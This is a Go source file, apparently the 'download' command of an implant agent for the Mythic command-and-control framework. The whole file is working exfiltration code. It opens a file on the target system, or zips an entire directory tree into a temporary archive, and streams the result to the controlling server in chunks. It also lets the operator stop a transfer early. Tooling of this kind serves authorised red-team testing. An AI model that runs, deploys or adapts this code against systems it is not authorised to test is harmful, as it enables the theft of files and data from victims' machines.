package commands

import (
	"archive/zip"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

// DownloadCommand implements the download command
type DownloadCommand struct{}

// Name returns the command name
func (c *DownloadCommand) Name() string {
	return "download"
}

// Description returns the command description
func (c *DownloadCommand) Description() string {
	return "Download a file or directory from the target system"
}

// Execute executes the download command with full chunked file transfer
func (c *DownloadCommand) Execute(task structs.Task) structs.CommandResult {
	// Strip surrounding quotes in case the user wrapped the path (e.g. "C:\Program Data\file.txt")
	path := stripPathQuotes(task.Params)

	if path == "" {
		return structs.CommandResult{
			Output:    "Error: No file path specified. Usage: download <file_path>",
			Status:    "error",
			Completed: true,
		}
	}

	// Get absolute path
	fullPath, err := filepath.Abs(path)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error resolving file path: %s", err.Error()),
			Status:    "error",
			Completed: true,
		}
	}

	// Check if path exists and whether it's a directory
	info, err := os.Stat(fullPath)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error accessing path: %s", err.Error()),
			Status:    "error",
			Completed: true,
		}
	}

	if info.IsDir() {
		return downloadDirectory(task, fullPath)
	}

	return downloadFile(task, fullPath)
}

// downloadFile handles single file downloads via Mythic's chunked transfer
func downloadFile(task structs.Task, fullPath string) structs.CommandResult {
	file, err := os.Open(fullPath)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error opening file: %s", err.Error()),
			Status:    "error",
			Completed: true,
		}
	}
	defer file.Close()

	fi, err := file.Stat()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error getting file info: %s", err.Error()),
			Status:    "error",
			Completed: true,
		}
	}

	return sendFileToMythic(task, file, fi.Name(), fullPath)
}

// downloadDirectory zips a directory into a temp file, downloads it, then cleans up
func downloadDirectory(task structs.Task, dirPath string) structs.CommandResult {
	// Create temp zip file
	tmpFile, err := os.CreateTemp("", "*.zip")
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error creating temp file: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	tmpPath := tmpFile.Name()

	// Ensure cleanup of temp file
	defer os.Remove(tmpPath)

	// Create zip archive of directory
	fileCount, totalSize, zipErr := zipDirectory(tmpFile, dirPath)
	tmpFile.Close()
	if zipErr != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error creating zip archive: %v", zipErr),
			Status:    "error",
			Completed: true,
		}
	}

	if fileCount == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: directory %s contains no accessible files", dirPath),
			Status:    "error",
			Completed: true,
		}
	}

	// Open the temp zip for transfer
	zipFile, err := os.Open(tmpPath)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error opening zip for transfer: %v", err),
			Status:    "error",
			Completed: true,
		}
	}
	defer zipFile.Close()

	zipInfo, _ := zipFile.Stat()
	zipSize := int64(0)
	if zipInfo != nil {
		zipSize = zipInfo.Size()
	}

	// Use the directory's base name + .zip as the download filename
	downloadName := filepath.Base(dirPath) + ".zip"

	result := sendFileToMythic(task, zipFile, downloadName, dirPath)
	if result.Status == "success" {
		result.Output = fmt.Sprintf("Downloaded directory as zip: %s (%d files, %s original, %s compressed)",
			dirPath, fileCount, statFormatSize(totalSize), statFormatSize(zipSize))
	}
	return result
}

// zipDirectory creates a zip archive of a directory, writing to the provided file.
// Returns file count, total uncompressed size, and any error.
func zipDirectory(w *os.File, dirPath string) (int, int64, error) {
	zw := zip.NewWriter(w)

	var fileCount int
	var totalSize int64
	const maxDepth = 10

	err := filepath.Walk(dirPath, func(path string, info os.FileInfo, walkErr error) error {
		if walkErr != nil {
			return nil // skip inaccessible entries
		}

		relPath, _ := filepath.Rel(dirPath, path)
		if relPath == "." {
			return nil
		}

		// Check depth
		depth := len(strings.Split(relPath, string(os.PathSeparator)))
		if depth > maxDepth {
			if info.IsDir() {
				return filepath.SkipDir
			}
			return nil
		}

		// Skip directories (created implicitly by file paths)
		if info.IsDir() {
			return nil
		}

		// Skip symlinks
		if info.Mode()&os.ModeSymlink != 0 {
			return nil
		}

		header, headerErr := zip.FileInfoHeader(info)
		if headerErr != nil {
			return nil
		}
		header.Name = filepath.ToSlash(relPath)
		header.Method = zip.Deflate

		writer, createErr := zw.CreateHeader(header)
		if createErr != nil {
			return nil
		}

		file, openErr := os.Open(path)
		if openErr != nil {
			return nil
		}
		defer file.Close()

		written, copyErr := io.Copy(writer, file)
		if copyErr != nil {
			return nil
		}

		fileCount++
		totalSize += written
		return nil
	})

	if err != nil {
		zw.Close()
		return fileCount, totalSize, err
	}

	if err := zw.Close(); err != nil {
		return fileCount, totalSize, fmt.Errorf("finalizing zip: %w", err)
	}

	return fileCount, totalSize, nil
}

// sendFileToMythic sends a file to Mythic via the chunked transfer channel
func sendFileToMythic(task structs.Task, file *os.File, fileName, fullPath string) structs.CommandResult {
	downloadMsg := structs.SendFileToMythicStruct{}
	downloadMsg.Task = &task
	downloadMsg.IsScreenshot = false
	downloadMsg.SendUserStatusUpdates = true
	downloadMsg.File = file
	downloadMsg.FileName = fileName
	downloadMsg.FullPath = fullPath
	downloadMsg.FinishedTransfer = make(chan int, 2)

	task.Job.SendFileToMythic <- downloadMsg

	for {
		select {
		case <-downloadMsg.FinishedTransfer:
			return structs.CommandResult{
				Output:    "Finished Downloading",
				Status:    "success",
				Completed: true,
			}
		case <-time.After(1 * time.Second):
			if task.DidStop() {
				return structs.CommandResult{
					Output:    "Tasked to stop early",
					Status:    "error",
					Completed: true,
				}
			}
		}
	}
}
